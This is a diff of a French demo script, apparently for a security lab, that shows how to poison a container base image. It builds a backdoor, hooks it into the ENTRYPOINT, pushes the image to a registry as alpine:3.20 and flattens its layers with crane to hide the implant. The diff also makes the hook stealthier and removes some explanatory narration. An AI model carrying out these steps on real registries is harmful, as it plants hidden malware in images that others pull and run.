@@ -28,8 +28,7 @@ trap cleanup EXIT
 p "=== DEMO ATTAQUE : Challenge 3 — Empoisonnement d'image de base ==="
 
 
-wait
-
+pe "crane manifest ${REGISTRY_HOST}/alpine:3.20 | jq '.layers[] | .digest'"
 # ============================================================================
 # Étape 1.1 — Création du script backdoor
 # ============================================================================
@@ -63,11 +62,6 @@ chmod +x "${WORK_DIR}/backdoor.sh"
 
 pe "bat ${WORK_DIR}/backdoor.sh"
 
-p "→ Le script crée un marqueur caché, exfiltre hostname et variables Kubernetes."
-p "→ En conditions réelles : reverse shell, vol de secrets, cryptominer..."
-
-wait
-
 # ============================================================================
 # Étape 1.2 — Création du Dockerfile malveillant
 # ============================================================================
@@ -91,15 +85,12 @@ RUN echo '#!/bin/sh' > /etc/profile.d/init.sh && \
 
 # Make the backdoor part of the default entrypoint behavior
 # When the container starts, our malware runs first
-ENTRYPOINT ["/bin/sh", "-c", "/usr/local/bin/backdoor.sh && exec \"$@\"", "--"]
+ENTRYPOINT ["/bin/sh", "-c", "/etc/profile.d/init.sh && exec \"$@\"", "--"]
 EOF
 
 pe "bat ${WORK_DIR}/Dockerfile"
 
-p "→ Le Dockerfile part de la vraie alpine:3.20, copie le backdoor,"
-p "  et modifie l'ENTRYPOINT pour l'exécuter au démarrage de tout conteneur."
 
-wait
 
 # ============================================================================
 # Étape 1.3 — Build de l'image empoisonnée
@@ -119,15 +110,14 @@ pei "podman login ${REGISTRY_HOST} -u ${REGISTRY_USER} -p ${REGISTRY_PASS} 2>/de
 pe "podman push ${REGISTRY_HOST}/alpine:3.20"
 
 p "→ L'image a été pushée. Regardons son manifest — on voit plusieurs couches :"
-pe "crane manifest ${REGISTRY_HOST}/alpine:3.20 | jq '.layers[] | .digest[:30]'"
+pe "crane manifest ${REGISTRY_HOST}/alpine:3.20 | jq '.layers[] | .digest'"
 
-p "→ Un analyste pourrait inspecter chaque couche et trouver le backdoor."
 p "→ Avec crane flatten, on fusionne toutes les couches en une seule :"
 
 pe "crane flatten ${REGISTRY_HOST}/alpine:3.20 -t ${REGISTRY_HOST}/alpine:3.20"
 
 p "→ Après le flatten, il n'y a plus qu'une seule couche :"
-pe "crane manifest ${REGISTRY_HOST}/alpine:3.20 | jq '.layers[] | .digest[:30]'"
+pe "crane manifest ${REGISTRY_HOST}/alpine:3.20 | jq '.layers[] | .digest'"
 
 p "→ Le backdoor est maintenant invisible dans l'historique des couches."
 
